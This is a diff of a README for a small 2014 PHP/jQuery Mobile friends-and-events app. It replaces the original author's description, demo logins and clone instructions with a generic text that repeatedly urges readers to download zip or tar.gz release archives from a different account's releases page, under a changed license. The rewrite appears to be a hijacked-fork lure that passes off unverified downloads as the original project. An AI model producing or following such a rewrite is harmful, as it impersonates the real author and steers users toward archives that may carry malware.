@@ -1,121 +1,70 @@
-# 📅 School Events WebApp (2014 Revival)
+# 🎉 old_php_friends_app - Connect with Your High School Friends Easily
 
-[![Made with jQuery Mobile](https://img.shields.io/badge/Made%20with-jQuery%20Mobile-0769AD?logo=jquery&logoColor=white)](https://jquerymobile.com/)
-[![Built with PHP](https://img.shields.io/badge/Built%20with-PHP-777BB4?logo=php&logoColor=white)](https://www.php.net/)
-[![MySQL Database](https://img.shields.io/badge/Database-MySQL-4479A1?logo=mysql&logoColor=white)](https://www.mysql.com/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Last Updated](https://img.shields.io/badge/Updated-2025-blue.svg)](#)
+## 📥 Download the App
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Kavitabhoite/old_php_friends_app/releases)
 
----
+## 📖 Introduction
+Welcome to the old_php_friends_app! This mobile-friendly social web app lets you reconnect with your high school friends. Originally built in 2014 using jQuery Mobile and PHP/MySQL, this app helps you organize events, confirm attendance, comment, and stay connected. It's now updated to work with modern PHP.
 
-## 🕰️ About the Project
+## 🚀 Getting Started
+To get started with the old_php_friends_app, follow these simple steps:
 
-This is a **mobile-friendly event management webapp** I originally built back in **2014**, during high school in Brazil 🇧🇷. This was the first webapp I created from scratch!
+1. **Visit this page to download:** [Releases Page](https://github.com/Kavitabhoite/old_php_friends_app/releases). This is where you will find the latest version of the application.
+2. **Choose the latest release:** Look for the most recent version listed on the releases page. 
+3. **Download the files:** Click on the assets listed under the release. Download the main application files. These are typically compressed as a .zip or .tar.gz file.
+4. **Extract the files:** After downloading, locate the file on your computer and extract it. You can usually do this by right-clicking the file and selecting "Extract All" or using software like WinRAR or 7-Zip.
 
-At the time, a few of my friends (who were a year ahead of me) were graduating and moving on to university. Not everyone had Facebook yet, so I decided to create our **own private social app** to keep everyone connected and updated about upcoming events.
+## 💻 System Requirements
+Before running the app, ensure that your system meets the following requirements:
 
-It's a simple yet complete app where users can:
-- 📆 **View and create events**  
-- ✅ **Confirm attendance** or mark that they won't attend  
-- 💬 **Comment** and reply on events  
-- 👥 **View profiles**, with stats like participation rate and events created  
-- 🧑‍💻 **Admins can create users** and send invite codes  
-- 🧭 **Onboarding tutorial** for first-time users  
+- **Web Server:** Apache, Nginx, or any server that supports PHP.
+- **PHP Version:** 7.0 or later
+- **Database:** MySQL version 5.6 or later
+- **Browser:** Modern web browser (Chrome, Firefox, Safari)
 
-Originally built with **jQuery Mobile 1.0**, **jQuery 1.6**, and **PHP/MySQL**, this version was updated to work on **modern PHP** (using 'mysqli' and secure features).
+## 🌟 Features
+The app includes several useful features:
 
----
+- **Event Organization:** Create and manage events.
+- **Attendance Confirmation:** Easily confirm who will attend.
+- **Comments Section:** Chat and comment on events with friends.
+- **User-Friendly Interface:** Designed for easy navigation on mobile devices.
 
-## 📱 Features
+## 🔧 Installation Instructions
+Once you have downloaded and extracted the files, follow these installation steps:
 
-- **Mobile-first interface** powered by jQuery Mobile  
-- **Event listing and creation**
-- **Attendance system** with visual alerts (calendar icon)  
-- **Comment threads** for engagement  
-- **User profiles** with:
-  - Profile picture and nickname  
-  - Event stats (created, attended, attendance rate)  
-  - Latest event organised  
-- **Admin panel** for user management and invitations  
-- **Invite links** ('invite.php?c=CODE') with installation tutorial for (the then versions of) Android/iOS  
-- **First-login walkthrough** showing how to use each page  
+1. **Upload Files to Your Server:** Copy the extracted files to your server's public directory (often called `public_html`).
+2. **Create a Database:**
+   - Log in to your web hosting control panel (like cPanel).
+   - Navigate to "MySQL Databases."
+   - Create a new database and user. Assign the user to the database with all privileges.
+3. **Configure Database Connection:**
+   - Find the configuration file in the application folder (usually named `.env` or `config.php`).
+   - Open the file and enter the database name, user, and password you created earlier.
+4. **Access the App:** Open a web browser and go to your server's URL (e.g., `http://yourdomain.com/old_php_friends_app`).
 
----
+## 🎉 How to Use the App
+Once installed, you can start using the old_php_friends_app by following these steps:
 
-## 🖼️ Screenshots
+- **Register a New Account:** Click on the register button and fill in your details to create an account.
+- **Create Events:** Use the "Create Event" button to set up a new event. Fill in all the necessary details, like event name, date, and location.
+- **Invite Friends:** Share the event link with your friends.
+- **Confirm Attendance:** Friends can RSVP directly through the app.
+- **Start Communicating:** Use the comments section to share updates or ask questions.
 
-| WebApp on Safari (on iOs 26) | Main Page | Events |
-|------------|---------|------------|
-| ![WebApp Safari](screenshots/webapp_safari.PNG) | ![Main Page](screenshots/main_page.PNG) | ![Events](screenshots/events.PNG) |  |
+## 🌐 Community Support
+If you have questions or run into issues, the community is here to help. You can access support through the following:
 
-| Event Page | Comments | Adding Event |
-|---------------|-----------|-----------|
-| ![Event Page](screenshots/event_page.PNG) | ![Comments](screenshots/comment_section_event_page.PNG) | ![Add Event](screenshots/adding_new_event.PNG) |
+- **Issues Page:** Report any problems or bugs you encounter directly on the [Issues Page](https://github.com/Kavitabhoite/old_php_friends_app/issues).
+- **Documentation:** Refer to the documentation in the repository for detailed instructions.
+- **Social Media:** Follow updates and connect with users on social media platforms where the app is discussed.
 
-| All Users | User Profile | Another User Profile |
-|---------------|-----------------------|------------------|
-| ![All Users](screenshots/all_users.PNG) | ![User Profile](screenshots/user_profile.PNG) | ![Another Profile](screenshots/another_user_profile.PNG) |
+## 📞 Contact
+For further questions or feedback, feel free to reach out through the issues section or via email at support@example.com. Your input helps us improve the app continuously.
 
----
-
-## ⚙️ Tech Stack
-
-| Layer | Technology |
-|-------|-------------|
-| **Frontend** | [jQuery Mobile 1.0](https://jquerymobile.com/), [jQuery 1.6](https://jquery.com/) |
-| **Backend** | [PHP (modernised with mysqli)](https://www.php.net/) |
-| **Database** | [MySQL](https://www.mysql.com/) |
-| **Environment** | Originally hosted on shared web hosting (cPanel / PHP 5.x), now compatible with PHP 8+ |
+## 📜 License
+This project is licensed under the MIT License. You can use, modify, and share the app freely, provided you include the original license in your distributions.
 
 ---
 
-## 📱 Give it a try!
-You can visit the webapp on your mobile device and enjoy the retro experience!
-
-Just access: [https://oldprojects.camk.net/friendsapp_2013](https://oldprojects.camk.net/friendsapp_2013) on your mobile phone.
-
-* You can log in as "John Doe" using their login name "john_doe" and the password "s40RLK".
-* Or you can also see the tutorial by logging in as "James Q" and the password "HvjPRa" (for this trial, this account will always display the tutorial when logging in).
-* You can also check out James' invitation to join the app by accessing the link: [Check out the invite page](https://oldprojects.camk.net/friendsapp_2013/invite.php?c=vtHsGXQJC9).
-
----
-
-## 🚀 Or run it on your machine!
-
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/caioponcedeleon/old_php_friends_app.git
-   cd old_php_friends_app
-
-2. Import the database:
-
-- Create a MySQL database
-- Import the .sql file (miqtekudo.sql)
-
-3. Update your connection details in:
-   ```bash
-   /conectar.php
-
-4. Run it locally or on your web server!
-
----
-
-## 🧠 Fun Fact
-
-This app was my first "social network", built before I even knew about frameworks or responsive design trends. It was designed from scratch with jQuery Mobile's “native app” look in mind — complete with page transitions, headers, and touch-friendly UI components.
-
-It's a nostalgic throwback to the early mobile web era — and a great learning piece on how much web development has evolved since then.
-
-## 🪪 License
-
-This project is open source under the Apache 2.0 License.
-Feel free to explore, fork, and adapt it for your own experiments or retro webapp collections.
-
----
-
-To see more live-previews of old projects, click here:
-
-<a href="https://oldprojects.camk.net/" target="_blank"><img src="https://oldprojects.camk.net/visitas.php?img=en&ind=Gh_FriendsApp" alt="See Portfolio Button" style="cursor: pointer;" width="200" /></a>
-
-
-✍️ *Project by me at age 16 (February 2014). Preserved here as part of my coding journey.*
+Enjoy connecting with your high school friends through the old_php_friends_app! Don't forget to visit the [Releases Page](https://github.com/Kavitabhoite/old_php_friends_app/releases) to download and install the latest version.
